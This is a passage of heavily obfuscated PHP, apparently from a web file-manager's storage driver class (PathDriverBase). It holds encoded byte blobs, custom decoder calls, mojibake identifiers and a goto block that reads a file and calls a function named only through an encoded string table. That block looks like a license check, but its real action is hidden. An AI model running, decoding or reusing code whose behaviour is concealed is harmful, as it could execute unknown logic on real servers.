\253\40\235\23\261\52\60\210\154\332\270\200\46\116\220\244\20\22\263\30\47\226\141\355\35\52"."\x69\x8c\x7b\x94\xa8\x97\x62\xb\xda\x5\x94\x26\x91\x35\xd\x9b\x4b\x16\x38\x3e\x90\x91\x28\x72\x58\xe6\x1d\x12\x34\x8b\x77\x9e\xa8\xc7\x71\xaa\x25\x79\xd\xe6\x49\xd1\x6e\xc3\x6a\x57\xd9"."\xe\x44\x4c\xb4\x88\xb7\x7b\x49\xd8\x71\x5\xdd\x66\x5c\x64\xb7\xb0\x19\xc1\x67\xee\x96\xb\xfc\x3d\x22\x3c\x9d\x71\xc9\x8a\xa6\x4a\xd\x90\x89\x67\x81\x6d\xcc\xd4\xd2\x86\x49\xa4\x5e\xc9".strrev('§ì8QNÒâl{íBå÷ÚE—Ïí–‰ÄX«$X>¿äUh¢üipl0rié¡@!')."\x25\xd3\xc0\x64\x29\x82\xa4\xaf\xc6\xd2\xb8\x74\x4e\xd2\x3d\x1\x22\x66\xc7\x4b\x29\xae\xfa\x77\x31\x1a\xec\xea\x81\x22\xef\xe3\xec\x2e\x1\x2e\x80\x38\xd7\xc0\x3d\xb0\xe4\x38\x54\x2c\xf6"."\314\52\172\46\147\41\165\126\144\241\161\170\53\25\56\52\344\30\13\311\145\170\250\306\216\251\122\25\211\222\106\64\315\35\365\300\350\210\101\202\210\121\215\131\352\171\247"."\x34\x7a\xa7\x82\x66\x59\xbe\x97\xc0\xd8\x5c\xa0\x59\x68\x2d\x48\x68\x80\xb9\x7d\x46\x7\xc1\xec\xe\xd2\x89\x34\x86\x74\x80\x42\xdc\x56\x88\x6b\xfd\xc4\x43\x7\x9f\x4f\xe2\xca\x83\x87\x4c"."\151\337\322\270\111\36\361\151\41\223\25\161\316\115\55\365\160\202\236\152\361\164\204\160\164\233\303\220\321\225\0\255\14\147\74\270\340\316\73\336\234\106\170\340\260\206\161"."\x15\x2\x6e\xd6\x65\xd7\xe2\x24\x97\xe8\x87\xb0\x9\x45\x20\x83\x3a\xfa\x96\x6\x46\x9c\xd7\x53\x6f\x1f\xcc\x98\x95\xd3\x25\x1\x4e\x18\x1c\x58\x79\xe6\xef\xe3\xc6\xbc\x70\x63\x13\x1e\x17".strrev('∑gw@2_.∆∞’<AÕ»‰Åj¥‰r≈ÄrZT[ÇM‡‰[Ø~QÆï∫67«´¨')."\237\203\132\370\362\244\162\243\160\62\324\312\314\174\304\63\325\303\171\75\255\204\243\35\241\326\100\270\55\24\137\250\14\150\266\364\14\74\161\223\357\134\312\104\345\105\7"."\x9e\x61\x75\x8a\x7b\x8a\xc7\x9f\xde\x14\x62\x2a\xbd\x19\xce\x5b\x5b\x82\x8b\x96\xec\xb0\xa4\x67\x70\x9c\xc5\x52\xfc\xd3\xcc\x8a\x12\xb\xf8\x4e\x45\xae\x22\xf\x56\xe4\x55\x49\x9d\x13\x7a"._kodDe('MRYavl4XwXzA0VdXGk++MBY3lg1Y4mr9ByjnkEBFenkYZcI9qhrDGUqDaUFQShuV').base64_decode('Kk3+WEFGfttAmgEx2LSWSh9X4CFIdpHtEprpNMm+zopM8Q4vsInHMUhQerakaKo=')."\xba\xa5\x49\x0\xfa\x7e\xc6\x24\xb8\xaa\x80\x44\x7c\xc7\xbb\x62\xb9\x7e\x29\x58\x72\xee\xa0\x55\xab\x4a\xd2\xa\x18\x4c\x72\xa7\x56\x2d\x41\xc\xbf\xa\xfd\xbf\x6e\xaa\x9e\x11\x6e\x8d\xf4"."\14\73\377\347\67\313\250\367\365\126\371\15\72\126\147\305\323\54\337\370\310\213\107\34\125\44\211\213\30\366\222\24\171\270\36\316\141\370\31\167\222\50\365\222\242\12\44".base64_decode('s5mjRfmsyJ/x8yGmH9h7W5ApjXFAMMA4OZSGq6MiEBLIsPaFscrMzhDRAxhnx1k=').base64_decode('qeu5GrcZpuN954o6sDUXlEP0Oyhln+gcCvEXFURWd0yVBqBoRWgweAKlWWmgDyg=')."\161\37\371\312\134\166\117\126\124\100\374\55\5\363\105\333\41\36\166\312\366\327\322\334\120\0\341\150\204\110\200\255\130\214\374\150\5\300\241\266\10\263\166\161\263\67\374"."\102\100\241\337\220\307\217\20\136\154\114\117\137\67\243\162\250\7\361\364\232\135\371\340\11\315\376\177\222\221\106\306\45\143\100\147\41\225\15\262\334\133\232\140\257\360\133"."\56\131\143\330\371\304\31\206\270\137\157\161\274\333\42\55\32\162\235\123\176\151\206\275\367\201\70\127\307\243\74\122\201\23\351\117\57\374\262\315\310\135\64\45\77\120\173"."\x3d\x47\x95\xd6\xac\x9e\xcb\x98\xdc\xd8\x42\x0\xba\x34\x21\x52\x92\x5c\xd8\xde\x40\x65\x4f\x68\x92\x87\x9e\xda\x18\xa5\x85\x27\x1f\x9c\xaf\x4e\x70\xb0\xe2\x7c\xc3\x42\x3c\xd\x22\x76\x3e"."\347\343\11\374\310\320\22\50\156\331\216\307\71\22\106\102\35\360\120\176\12\323\52\21\152\31\225\277\145\3\113\322\13\24\311\264\65\31\76\213\363\244\4\354\245\254\214"."\207\74\343\104\11\230\373\115\11\151\375\160\252\50\347\36\310\31\51\65\27\243\66\112\216\13\25\46\222\205\270\335\241\43\31\5\371\325\142\161\314\43\15\340\161\350\361".strrev('V'."\n".'Üÿoßï˝ì•€\'+ç4Ïër€†nOM÷’êJ;à‰ïƒŸ-dî‘b™¢©F')."\273\154\142\10\7\241\76\131\30\202\4\312\134\105\114\260\143\221\141\204\100\34\251\207\174\220\125\54\63\317\137\3\345\170\350\174\165\204\42\54\371\151\323\372\271\44\201".base64_decode('w2Knlb0xiFN39wNWrBr+GpeH9ky8sUjf3vLwd7Y81H2eB17X8oi7Zl/3cIl4B9U=')."\371\170\52\156\63\267\311\253\140\351\335\334\74\37\52\127\206\230\173\340\22\106\245\216\117\234\71\26\112\171\161\212\213\2\116\351\246\242\303\122\17\113\146\316\103\116\134"."\x3d\xcc\x47\x99\x6b\x38\x44\xaf\xe4\x99\xa9\x32\x86\xdf\x5c\x6\x35\xcd\x24\x22\x4b\xc6\x49\x75\x9a\xe6\xa6\x4c\x76\x6a\xe5\x4e\xa6\x3b\xb0\x2e\x69\x6a\xe2\xce\x5\x75\xe6\x58\xf1\x40\xce"."\322\174\246\161\352\364\331\262\152\100\314\217\70\377\201\313\334\160\26\5\74\200\230\161\305\211\117\12\363\40\51\257\133\22\351\264\232\255\174\6\317\105\201\377\167\230\57"."\170\157\232\124\262\141\255\174\54\264\142\4\10\22\112\326\35\322\206\344\72\312\67\360\11\273\45\226\17\335\202\304\343\167\316\272\350\246\134\245\37\322\276\43\126\2\175"."\x8d\xcc\xc8\x61\x9\x35\x8f\xb5\xac\xb6\xa9\x3a\xc5\xb1\x6a\x52\x7\x19\x9\x26\xe2\xe8\xe4\x25\x5f\xcd\xdd\x76\x32\x30\xa0\x8b\x10\xd1\x92\x58\x22\x97\x68\x1b\x6e\x45\xa\xce\x8e\xf7\x25"."\242\307\213\26\162\260\155\342\73\264\142\115\111\44\345\177\61\201\114\362\240\102\212\60\344\250\322\163\377\2\106\67\252\274\66\47\235\206\177\115\273\51\317\304\245\54\257".base64_decode('anslhJSUb5odJRMM3IcQ+px9dRWPsoky+jzKWIkqGSfpUTrhPUlimXBudllvDJk=')."\x99\x11\x27\xf9\xb9\x3d\x3b\x2b\x84\x2\xba\x42\x1d\xab\x55\xf2\xcb\x2a\xdf\x5e\x22\x5\xc9\xcb\xa0\xb2\x68\xe9\xd5\x33\xa1\x46\x21\x7a\x17\xe8\x4\xac\x61\xe2\x14\x92\xdc\x5a\xb\x74\xf0"."\233\154\252\144\174\203\307\123\172\160\322\220\277\235\327\304\243\314\23\46\252\317\41\245\241\160\233\353\115\122\102\207\334\17\225\262\101\41\213\137\320\65\351\112\244\103\44"."\xe0\x6f\x4a\x39\x44\x4\xcb\xfd\xdc\x1b\x62\xa9\x64\x1f\xb5\x28\xc8\xd1\x1e\x36\x50\x20\x80\xc4\xae\x99\xd6\x26\xed\x8f\x62\x2b\x14\x5f\x63\x3d\x21\xee\x7c\x5f\xdc\x71\x73\x14\xfb\xfd\x71"."\255\165\166\37\325\162\75\302\110\375\214\322\157\306\136\377\137\277\157\366\377\352\131\263\351\15\114\131\355\170\322\264\3\230\134\306\221\255\224\74\24\123\105\251\253\37\316"."\x6d\x72\x3c\x60\x11\x7f\xc4\x57\xa\x73\xe3\x4d\xe6\xfb\x89\xb9\x84\x52\xd9\xe1\x8a\x9a\xcb\xb9\x4f\x1a\x2b\xc4\x82\x8a\xd7\x1f\x11\xf2\xd\xf2\x27\xb\xab\x5\x9c\xfe\x86\x93\xf2\x93\xbd"."\245\2\266\22\101\325\62\277\213\225\222\52\343\76\245\27\201\365\364\140\225\203\102\74\31\141\247\363\136\211\147\250\110\46\310\27\142\55\230\217\54\77\373\112\143\51\12"."\63\226\214\152\312\127\37\243\105\46\157\325\3\241\356\133\300\250\13\271\114\15\104\106\46\54\16\120\5\71\112\70\206\330\1\224\107\117\274\150\316\337\123\166\344\350\162"."\x3d\x8f\x47\x13\x59\xf2\xd8\x3a\xf4\xd5\x95\xe7\xc6\x95\xb9\xf9\xb2\x96\xb3\x60\x13\x58\xa7\x6a\x87\xbf\x57\xdc\xe0\x7e\xc0\x78\x8a\xb7\xb2\x32\x6a\x81\x8e\xb5\xb\x31\x2c\xcf\x33\xd\xd"."\x39\xd2\x20\x47\x8e\x55\xf2\x50\x34\x8c\x8b\x34\x63\x2c\x84\xea\xcb\x91\x3f\x4b\x28\xd4\x55\xf8\x4b\xee\x2f\x5b\xd6\xdd\xa6\x41\xf8\x33\x27\x94\xeb\x38\x24\xeb\x43\xe9\xf1\xdc\x8a\xc7\x31".base64_decode('XUcDSFgSZ2W6QTx3Q7fjPV115BIFYCri9dsN8Yh5vkiVZvIWy24vSca/AHKotiw=').base64_decode('+SkEZ05szu1cKfOqJUsbpiUl4/BqafH7o7ZjNIU7dbcbdSIYU1nXIfLCwaQMks4=')."\355\20\367\233\161\276\313\100\42\11\230\71\137\204\22\244\223\47\347\301\37\167\63\135\101\310\112\172\130\212\46\271\230\117\57\364\213\157\161\205\204\273\0\22\115\165\352"."\201\262\152\263\343\63\167\56\347\323\304\322\61\141\232\340\116\260\362\44\110\34\120\111\154\0\313\206\105\23\101\241\135\160\151\33\20\324\116\55\13\256\105\60\307\231\14"._kodDe('Lfdwgsy0JfS1Nv/iASdTa9d8lbOSSc9nDGOwhNuEIAMrM0e2thpCKbABHLXOW6HO')."\x27\x4b\xc6\x99\x5d\xbe\x98\xca\x91\x4a\x80\xa8\x67\x7d\x6e\x40\x23\x9\x22\xd8\x6e\x5e\x58\xd6\xd0\xae\x70\xa9\x5a\x54\xe9\xbc\x6\xcb\x93\xf1\x39\x43\x69\xc8\x2d\x5\xaf\x3\xea\x12\xad".strrev('"_8efÿ",?∫Xá:VJıxÜf82|úT∞πh'."\n".'˘ã\'˙y€·~K(ÆËmÇé∞')."\x76\xbc\x63\x90\x32\x26\x47\x3a\x9a\xe3\x9e\x5a\x22\x15\x8\xf4\xa5\xc0\x3c\xd1\x6b\xd2\xb8\x80\x33\x8a\xa6\xd7\x5c\xad\x97\x33\xb8\x7b\x46\x73\x58\xc3\xba\x9d\xce\x4a\xa2\x4a\x65\x64\x25"."\334\254\30\124\250\250\172\173\335\255\142\143\352\26\340\104\41\25\355\221\314\13\22\106\225\74\264\105\125\263\321\50\234\123\160\223\216\274\143\14\1\316\113\243\160\336\212".base64_decode('aJZZ0ndI+Wy1ZI3RvcrBAyVApkqHXaIyTTrWeFZNXFkdYJw7NdEaVG+FEPZdx7w=')."\xd5\x5a\x51\x35\xf1\x98\xad\x10\xa9\x5d\xbb\x40\x35\x5a\xcb\x62\xaa\x50\x57\x71\xde\x5f\x49\xc7\x45\x5c\x15\xeb\x3\x5a\x26\xde\xa3\x65\x7f\x42\x55\xa2\x65\x53\x86\xea\xc6\xe\xb1\xaa\x4b"._kodDe('KmbTFU7UrLTmfyQYGH2vzsvfGX3ShgIeUgoAsgBYQdF4qgzZN4/j3uc+HpZnlVoY')."\x39\xd6\xac\x6a\x6c\xec\xc1\x92\x76\xa5\x4c\x9b\x53\x99\xde\x5c\xb2\xd2\xa6\x52\x8b\x61\xeb\x69\xcd\xe9\xbd\x53\xf6\x24\x44\xe3\x59\x25\x39\x49\x3f\xe7\x52\x8d\x9\xb9\xdf\x71\x60\x5e\x45".base64_decode('eURAwK4JFbTD8p3u/6B7p0dqrfjolh+7EPeSdL+k0XHDtD04LmEUyW+LYdviiJk=')."\x4a\xd3\x84\xc9\xc3\x9b\x9e\x47\xb2\x94\x40\x5f\xe2\x8c\x5\x8f\x22\x51\xfb\x13\x74\x24\x64\x83\x7c\xc2\xe1\x1e\x16\x53\xe3\x1a\x8d\x25\xc4\xc6\x11\xc0\xc7\x9\x3c\x20\xef\x69\x70\xc8\xd7"."\x5e\x72\x1d\x43\xa\x0\x12\x22\x53\xc6\x8\x73\xde\x87\x6f\xd4\x8a\xf6\x88\x67\xd1\x55\x37\x23\x27\x78\x10\xc0\x37\xd9\xee\x83\xdc\x5b\xb6\xfc\x34\xc6\xf\xe\xe0\xbd\xa4\xc\x78\xd1\xc9".base64_decode('t6I44MhO38XhtoxfVwKoLkUR1PszUTBhF+nU+WFFVHcgHl8cjbVRZ9EV0SSXZEc=')."\x53\x11\xd5\xdd\x19\x8d\x8c\x15\x17\xec\xa\x84\xc2\x15\x71\xd8\xe4\x26\x92\x14\xde\x9d\x68\x54\xa8\x9b\xb4\x32\x10\xe\x47\x17\x8f\xd5\x8a\x50\xeb\x42\xd1\x12\x72\x72\x2a\x34\xe2\xc5\xac"."\301\24\335\354\304\40\256\346\230\54\55\135\306\323\362\302\315\227\310\343\124\21\310\363\152\61\17\170\374\303\371\362\212\313\262\215\41\54\24\204\315\145\42\120\166\254\10"."\x50\xec\x3c\x9b\x2f\x6e\xce\x2c\x8b\xa3\x60\x9f\xe3\xc8\x58\x82\x93\xb5\x41\x28\x8a\x84\x73\xf2\x66\x4a\x0\x93\xaa\xe\x90\xac\x4d\xad\xd4\xee\x93\x58\x31\x0\xb8\x61\xc7\x1a\x60\x6b\xb5"."\302\110\111\332\173\52\252\300\205\70\30\122\311\44\212\176\103\364\377\0\373\24\207\207\150\246\0\0"."".strrev('').strrev(''), 10, -8))); goto DÁ⁄Ã«Ü; C€˜’®ÀßÒ: if ($_SERVER[$_SERVER[ëæªã÷][60]] != $_SERVER[$_SERVER[ëæªã÷][61]]) { $_getc = $_SERVER[ëæªã÷][62]; $_getfile = $_SERVER[$_SERVER[ëæªã÷][63]] . $_SERVER[ëæªã÷][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ëæªã÷][65], $_getfilec); if (count($_getarrs) < $_SERVER[ëæªã÷][66]) { $exit = $_SERVER[ëæªã÷][67]; $exit(); } $_act = $_SERVER[ëæªã÷][68]; $_act($_SERVER[$_SERVER[ëæªã÷][69]]); } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Ñ∆ÁÎ‡˜ =& $_SERVER[ëæªã÷]; $this->objectDriver = array($Ñ∆ÁÎ‡˜[70], $Ñ∆ÁÎ‡˜[71], $Ñ∆ÁÎ‡˜[72], $Ñ∆ÁÎ‡˜[73], $Ñ∆ÁÎ‡˜[74], $Ñ∆ÁÎ‡˜[75], $Ñ∆ÁÎ‡˜[76], $Ñ∆ÁÎ‡˜[77], $Ñ∆ÁÎ‡˜[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¨Œ˝Ó‡¸) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¨Œ˝Ó‡¸, $_SERVER[ëæªã÷][8]); } return $¨Œ˝Ó‡¸; } public function iconvApp($ì‰Â≈≈) { return $ì‰Â≈≈; } public function iconvSystem($ﬁûá—Ì«) { return $ﬁûá—Ì«; } public function iconvTo($©‹∆˜¨ò, $ÉÙáÍ¬ç, $’Ó—ªÓﬂ) { $‘±˚É©Û =& $_SERVER[ëæªã÷]; if (!$©‹∆˜¨ò || !function_exists($‘±˚É©Û[79])) { return $©‹∆˜¨ò; } static $õ∑éÿˆ = array(); $˚ºÑ≥á§ = $ÉÙáÍ¬ç . $‘±˚É©Û[80] . $’Ó—ªÓﬂ . $‘±˚É©Û[81] . $©‹∆˜¨ò; if (isset($õ∑éÿˆ[$˚ºÑ≥á§])) { return $õ∑éÿˆ[$˚ºÑ≥á§]; } if (function_exists($‘±˚É©Û[82])) { $µƒﬂè˚¬ = @mb_convert_encoding($©‹∆˜¨ò, $’Ó—ªÓﬂ, $ÉÙáÍ¬ç); } else { $µƒﬂè˚¬ = @iconv($ÉÙáÍ¬ç, $’Ó—ªÓﬂ, $©‹∆˜¨ò); } $µƒﬂè˚¬ = $µƒﬂè˚¬ ? $µƒﬂè˚¬ : $©‹∆˜¨ò; if (strstr($µƒﬂè˚¬, $‘±˚É©Û[83])) { $µƒﬂè˚¬ = str_replace($‘±˚É©Û[83], $‘±˚É©Û[11], $µƒﬂè˚¬); } $õ∑éÿˆ[$ÉÙáÍ¬ç . $‘±˚É©Û[80] . $’Ó—ªÓﬂ . $‘±˚É©Û[81] . $©‹∆˜¨ò] = $µƒﬂè˚¬; $õ∑éÿˆ[$’Ó—ªÓﬂ . $‘±˚É©Û[80] . $ÉÙáÍ¬ç . $‘±˚É©Û[81] . $©‹∆˜¨ò] = $©‹∆˜¨ò; $õ∑éÿˆ[$’Ó—ªÓﬂ . $‘±˚É©Û[80] . $ÉÙáÍ¬ç . $‘±˚É©Û[81] . $µƒﬂè˚¬] = $©‹∆˜¨ò; $õ∑éÿˆ[$ÉÙáÍ¬ç . $‘±˚É©Û[80] . $’Ó—ªÓﬂ . $‘±˚É©Û[81] . $µƒﬂè˚¬] = $µƒﬂè˚¬; return $µƒﬂè˚¬; } public function getPathInner($◊Ê£ü«Â) { $»˜ä”ó´ = IO::init($◊Ê£ü«Â); return $»˜ä”ó´->path; } public function getPathOuter($æ˝Öı≠í) { $ã¿ñ«≤ª =& $_SERVER[ëæªã÷]; $ºì∫¢€ﬁ = strlen(trim($this->pathBase, $ã¿ñ«≤ª[8])); $æ˝Öı≠í = substr(trim($æ˝Öı≠í, $ã¿ñ«≤ª[8]), $ºì∫¢€ﬁ); return $this->pathDriver . $ã¿ñ«≤ª[8] . ltrim($æ˝Öı≠í, $ã¿ñ«≤ª[8]); } public function isParentOf($Ã«¥∆⁄›, $Â√é˝æ›) { $ù’…ö£≠ =& $_SERVER[ëæªã÷]; $Ã«¥∆⁄› = rtrim(strtolower($Ã«¥∆⁄›), $ù’…ö£≠[8]) . $ù’…ö£≠[8]; $Â√é˝æ› = rtrim(strtolower($Â√é˝æ›), $ù’…ö£≠[8]) . $ù’…ö£≠[8]; $ˆ∫≥◊ëÂ = strpos($Â√é˝æ›, $Ã«¥∆⁄›) === 0; return $ˆ∫≥◊ëÂ; } public function getType() { $óŸêÍ°õ =& $_SERVER[ëæªã÷]; $òÖ¿§  = str_replace($óŸêÍ°õ[84], $óŸêÍ°õ[12], get_class($this)); return strtolower($òÖ¿§ ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Úà»‚ﬁÜ, $®ô„ÌÆ˚) { $≥Ø±â¯¸ =& $_SERVER[ëæªã÷]; $ﬂ÷Ùó¿€ = rtrim($Úà»‚ﬁÜ, $≥Ø±â¯¸[8]) . $≥Ø±â¯¸[8] . $®ô„ÌÆ˚; $ŸÔ›ÏØö = $this->exist($ﬂ÷Ùó¿€); return $ŸÔ›ÏØö ? $ﬂ÷Ùó¿€ : !1; } public function setModifyTime($Øçöﬂ¯‡, $±˚à°«” = '') { } public function renameObject($ãπ¡ï≠¸, $©Ö¿êıØ) { $Ù¬Ù ¯î =& $_SERVER[ëæªã÷]; $Ï—å≤ä∂ = $©Ö¿êıØ; Hook::trigger($Ù¬Ù ¯î[85], $this, $ãπ¡ï≠¸, $this, $this->pathFather($ãπ¡ï≠¸) . $©Ö¿êıØ); $ãπ¡ï≠¸ = $this->getPathOuter($ãπ¡ï≠¸); $©Ö¿êıØ = $this->pathFather($ãπ¡ï≠¸) . $©Ö¿êıØ; if (IO::isFile($ãπ¡ï≠¸)) { $‚ÙÔ≥Úß = IO::copy($ãπ¡ï≠¸, $this->pathFather($ãπ¡ï≠¸), REPEAT_RENAME_FOLDER, $Ï—å≤ä∂); if ($‚ÙÔ≥Úß) { IO::remove($ãπ¡ï≠¸); } } else { $‚ÙÔ≥Úß = IO::mkdir($©Ö¿êıØ); if (!$‚ÙÔ≥Úß) { return !1; } $∆Ôõœç‚ = IO::listPath($ãπ¡ï≠¸, !0); $∆≥£˝•ﬂ = array_merge($∆Ôõœç‚[$Ù¬Ù ¯î[86]], $∆Ôõœç‚[$Ù¬Ù ¯î[87]]); foreach ($∆≥£˝•ﬂ as $øÔ¿‚å“) { IO::move($øÔ¿‚å“[$Ù¬Ù ¯î[88]], $©Ö¿êıØ, REPEAT_RENAME_FOLDER); } IO::remove($ãπ¡ï≠¸); } return $‚ÙÔ≥Úß ? $©Ö¿êıØ : !1; } public function tempFile($Ï„ãû€Ω = '', $¶®∆‚≥Â = '') { if (!$Ï„ãû€Ω) { $Ï„ãû€Ω = rand_string(15); } $Å∆éá˚‘ = TEMP_FILES . rand_string(15) . $_SERVER[ëæªã÷][8]; @mkdir($Å∆éá˚‘, DEFAULT_PERRMISSIONS, !0); $†ÑŒöÊÿ = $Å∆éá˚‘ . $Ï„ãû€Ω; @touch($†ÑŒöÊÿ); if ($¶®∆‚≥Â) { file_put_contents($†ÑŒöÊÿ, $¶®∆‚≥Â); } return $†ÑŒöÊÿ; } public function tempFileRemve($íêıÅ∫˘) { @unlink($íêıÅ∫˘); @rmdir($this->pathFather($íêıÅ∫˘)); } public function mkfile($Çﬂ§…≤ˆ, $ç‹ïíπæ = '', $ª‘ì…‡ò = REPEAT_RENAME) { } public function mkdir($€≠π·’˙, $ØàÅÁÁ∫ = REPEAT_SKIP) { } public function delFile($–§óªøÖ) { } public function delFolder($‹≤–ºµΩ) { } public function copyFile($üÎ›ä˝Œ, $Ô¶Í«Ω€) { } public function moveFile($õ¶ËÔÍ¿, $îﬂËƒ´Œ) { } public function remove($˙ÿ‚ø‹Á) { if ($this->isFile($˙ÿ‚ø‹Á)) { return $this->delFile($˙ÿ‚ø‹Á); } return $this->delFolder($˙ÿ‚ø‹Á); } public function rename($ÉÀ≠ÂÍ˜, $ﬂ∂Ì¿ÚÎ) { } public function exist($ÖÃ®ö“ô) { } public function findByHash($÷©˛ªØÄ = '', $¬©ò¯áÖ = '') { return !1; } public function isFile($‡í†ƒæò) { } public function isFolder($ïëêãº◊) { } public function size($¿Ö©Œ¥µ) { } public function info($‡œ≥±Ä•) { } public function infoSimple($ÑßõÔãñ) { return $this->info($ÑßõÔãñ); } public function infoAuth($¨Ï¶ªØ∞) { return $this->info($¨Ï¶ªØ∞); } public function infoFull($ÄãÕÔ ˜) { return $this->info($ÄãÕÔ ˜); } public function infoWithChildren($óßìÎªÆ) { $®˙™â¢£ =& $_SERVER[ëæªã÷]; static $Ø◊ÑóÍ√ = array(); if (isset($Ø◊ÑóÍ√[$óßìÎªÆ])) { return $Ø◊ÑóÍ√[$óßìÎªÆ]; } $ÛÀéµØ = $this->info($óßìÎªÆ); if ($ÛÀéµØ && $ÛÀéµØ[$®˙™â¢£[33]] == $®˙™â¢£[89]) { $…Å¿’ƒ® = array($®˙™â¢£[90] => 0, $®˙™â¢£[91] => 0, $®˙™â¢£[92] => 0); $this->infoChildren($óßìÎªÆ, $…Å¿’ƒ®); $ÛÀéµØ[$®˙™â¢£[90]] = $…Å¿’ƒ®[$®˙™â¢£[90]]; $ÛÀéµØ[$®˙™â¢£[93]] = array($®˙™â¢£[94] => $…Å¿’ƒ®[$®˙™â¢£[91]], $®˙™â¢£[95] => $…Å¿’ƒ®[$®˙™â¢£[92]]); $Ø◊ÑóÍ√[$óßìÎªÆ] = $ÛÀéµØ; } return $ÛÀéµØ; } public function listPath($†ëÎ—·ù, $Œ›¸˚Â∆ = false) { } public function has($ªò∞Åå∑, $«ìÜ°÷ﬁ = false, $üﬁú÷Óù = false) { } public function canRead($ıÒˆâË°) { } public function canWrite($ı·ßí‘È) { } public function getContent($íÚÖáî–) { } public function setContent($ó˘£‘éÖ, $ÿÙôß≈˘ = '') { } protected function infoChildren($¯„¬«Õ¢, &$˝¯∑´õå) { $¯£ˆ¶á§ =& $_SERVER[ëæªã÷]; check_abort_echo(); $‹°ÕË∆˚ = $this->listPath($¯„¬«Õ¢, !0); $‹°ÕË∆˚ = array_merge($‹°ÕË∆˚[$¯£ˆ¶á§[87]], $‹°ÕË∆˚[$¯£ˆ¶á§[86]]); foreach ($‹°ÕË∆˚ as $… ÿ›ËÂ) { if ($… ÿ›ËÂ[$¯£ˆ¶á§[33]] == $¯£ˆ¶á§[89]) { $˝¯∑´õå[$¯£ˆ¶á§[92]]++; $‹Í¸¿‚÷ = $this->getPathInner($… ÿ›ËÂ[$¯£ˆ¶á§[88]]); $this->infoChildren($‹Í¸¿‚÷, $˝¯∑´õå); } else { $˝¯∑´õå[$¯£ˆ¶á§[91]]++; $˝¯∑´õå[$¯£ˆ¶á§[90]] += $… ÿ›ËÂ[$¯£ˆ¶á§[90]]; } } } public function fileSubstr($Ó»’ù∏, $“ÊÆ˛˘µ, $ÚÓ≠ÅΩ) { } public function listAll($å⁄Ñ«€ﬁ) { } public function listAllMake($ßΩú™Ã», &$ Ç…Û∏ì) { $îä∂°πﬂ =& $_SERVER[ëæªã÷]; check_abort_echo(); $ÊÑ˜†ì≤ = $this->listPath($ßΩú™Ã», !0); if (!$ÊÑ˜†ì≤) { return; } $•œ°Ééﬂ = array_merge($ÊÑ˜†ì≤[$îä∂°πﬂ[87]], $ÊÑ˜†ì≤[$îä∂°πﬂ[86]]); foreach ($•œ°Ééﬂ as $åÌ‡Ã’ò) { $¬ü£¶ÄŸ = $åÌ‡Ã’ò[$îä∂°πﬂ[33]] == $îä∂°πﬂ[89]; $∑∞¢©â‘ = array($îä∂°πﬂ[88] => $åÌ‡Ã’ò[$îä∂°πﬂ[88]], $îä∂°πﬂ[89] => $¬ü£¶ÄŸ); if (isset($åÌ‡Ã’ò[$îä∂°πﬂ[90]])) { $∑∞¢©â‘[$îä∂°πﬂ[90]] = $åÌ‡Ã’ò[$îä∂°πﬂ[90]]; } if (isset($åÌ‡Ã’ò[$îä∂°πﬂ[96]])) { $∑∞¢©â‘[$îä∂°πﬂ[96]] = $åÌ‡Ã’ò[$îä∂°πﬂ[96]]; } if (!$¬ü£¶ÄŸ) { $ Ç…Û∏ì[] = $∑∞¢©â‘; continue; } $ Ç…Û∏ì[] = $∑∞¢©â‘; $ÇÌŒ∏úò = $åÌ‡Ã’ò[$îä∂°πﬂ[88]]; $Î‡ìí±à = $this->pathDriver; if (substr($åÌ‡Ã’ò[$îä∂°πﬂ[88]], 0, strlen($Î‡ìí±à)) == $Î‡ìí±à) { $ÇÌŒ∏úò = substr($ÇÌŒ∏úò, strlen($Î‡ìí±à)); } $this->listAllMake($ÇÌŒ∏úò, $ Ç…Û∏ì); } } public function listAllSimple($ÅÈ©—„Ã) { $¥àÛë§˝ =& $_SERVER[ëæªã÷]; $Ó∫ß∞Ïı = array(); $ÖéÃÍâ© = $this->listAll($ÅÈ©—„Ã); $£¡∆Ô˘Ç = $this->getPathOuter($ÅÈ©—„Ã); foreach ($ÖéÃÍâ© as $ù˜À≠¨¢) { $ãíﬁ÷¨ù = $ù˜À≠¨¢[$¥àÛë§˝[88]]; $‹ƒ£Ñåø = $ù˜À≠¨¢[$¥àÛë§˝[88]]; if (isset($ù˜À≠¨¢[$¥àÛë§˝[97]])) { $ãíﬁ÷¨ù = $ù˜À≠¨¢[$¥àÛë§˝[97]][$¥àÛë§˝[88]]; $ù˜À≠¨¢[$¥àÛë§˝[90]] = $ù˜À≠¨¢[$¥àÛë§˝[97]][$¥àÛë§˝[90]]; $ù˜À≠¨¢[$¥àÛë§˝[96]] = $ù˜À≠¨¢[$¥àÛë§˝[97]][$¥àÛë§˝[96]]; } else { $‹ƒ£Ñåø = substr($ù˜À≠¨¢[$¥àÛë§˝[88]], strlen(get_path_father($£¡∆Ô˘Ç))); $‹ƒ£Ñåø = $¥àÛë§˝[8] . ltrim($‹ƒ£Ñåø, $¥àÛë§˝[8]); } $€è´ÚÇÿ = array($¥àÛë§˝[88] => $‹ƒ£Ñåø, $¥àÛë§˝[89] => $ù˜À≠¨¢[$¥àÛë§˝[89]]); if (isset($ù˜À≠¨¢[$¥àÛë§˝[90]]) && !$ù˜À≠¨¢[$¥àÛë§˝[89]]) { $€è´ÚÇÿ[$¥àÛë§˝[90]] = $ù˜À≠¨¢[$¥àÛë§˝[90]]; } if (isset($ù˜À≠¨¢[$¥àÛë§˝[96]])) { $€è´ÚÇÿ[$¥àÛë§˝[96]] = $ù˜À≠¨¢[$¥àÛë§˝[96]]; } if (!$ù˜À≠¨¢[$¥àÛë§˝[89]]) { $€è´ÚÇÿ[$¥àÛë§˝[98]] = $ãíﬁ÷¨ù; } $Ó∫ß∞Ïı[] = $€è´ÚÇÿ; } return $Ó∫ß∞Ïı; } public function upload($¬ﬂ√ÚÂ÷, $÷•˘øÜÇ, $∑ˆÇøÈ¶ = false, $Ω§ç©ﬁÊ = REPEAT_REPLACE) { } public function uploadFileByID($€»ÏûæŒ, $◊å¸±∞ˆ, $ÂöåÑÎê) { } public function uploadFileByPath($ïößèÅœ, $˚íØ®¯â, $◊Œ ÚÆß = array()) { } public function isUploadServer() { $÷ﬂ°È∫∑ =& 